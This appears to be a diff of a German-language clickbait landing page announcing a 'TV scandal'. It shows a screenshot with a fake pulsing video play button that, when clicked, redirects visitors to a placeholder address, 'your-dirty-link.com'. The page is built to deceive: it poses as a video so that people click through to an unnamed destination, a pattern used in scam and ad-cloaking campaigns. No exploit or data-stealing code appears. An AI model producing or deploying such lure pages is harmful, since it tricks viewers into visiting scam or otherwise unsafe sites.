@@ -3,74 +3,59 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Live Skandal im Fernsehen</title>
+  <title>Eilmeldung – Skandal im TV</title>
   <style>
     body {
       margin: 0;
-      padding: 0;
-      background-color: #000;
+      background: black;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      overflow: hidden;
     }
-    #pulse-button {
+    .container {
       position: relative;
       width: 90%;
-      max-width: 400px;
-      cursor: pointer;
-      border: none;
-      background: none;
-      outline: none;
+      max-width: 500px;
     }
-    #pulse-button::after {
-      content: '';
+    .container img {
+      width: 100%;
+      height: auto;
+      border-radius: 10px;
+    }
+    .play-button {
       position: absolute;
       top: 50%;
       left: 50%;
-      width: 100px;
-      height: 100px;
-      background: rgba(255, 0, 0, 0.5);
-      border-radius: 50%;
       transform: translate(-50%, -50%);
+      width: 80px;
+      height: 80px;
+      background: radial-gradient(circle, rgba(255,0,0,0.7) 0%, rgba(255,0,0,0.3) 70%);
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
       animation: pulse 1.5s infinite;
-      z-index: 1;
+      cursor: pointer;
     }
-    #pulse-button img {
-      width: 100%;
-      border-radius: 10px;
-      position: relative;
-      z-index: 2;
+    .play-button::before {
+      content: '';
+      border-style: solid;
+      border-width: 15px 0 15px 25px;
+      border-color: transparent transparent transparent white;
+      margin-left: 5px;
     }
     @keyframes pulse {
-      0% {
-        transform: translate(-50%, -50%) scale(1);
-        opacity: 0.7;
-      }
-      70% {
-        transform: translate(-50%, -50%) scale(1.5);
-        opacity: 0;
-      }
-      100% {
-        transform: translate(-50%, -50%) scale(1);
-        opacity: 0;
-      }
+      0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+      50% { transform: translate(-50%, -50%) scale(1.1); opacity: 0.7; }
+      100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
     }
   </style>
 </head>
 <body>
-
-<button id="pulse-button">
-  <img src="https://ibb.co/2YKzCxh8" alt="Live Skandal Video">
-</button>
-
-<script>
-  document.getElementById('pulse-button').addEventListener('click', function() {
-    document.cookie = "visited=true; Max-Age=86400; Path=/; Secure";
-    window.location.href = "/";
-  });
-</script>
-
+  <div class="container">
+    <img src="https://raw.githubusercontent.com/shenefieldlance/rewardme-white/main/Screenshot%202025-04-26%20at%2023.05.52.png" alt="Skandal Live TV">
+    <div class="play-button" onclick="window.location.href='https://your-dirty-link.com'"></div>
+  </div>
 </body>
 </html>
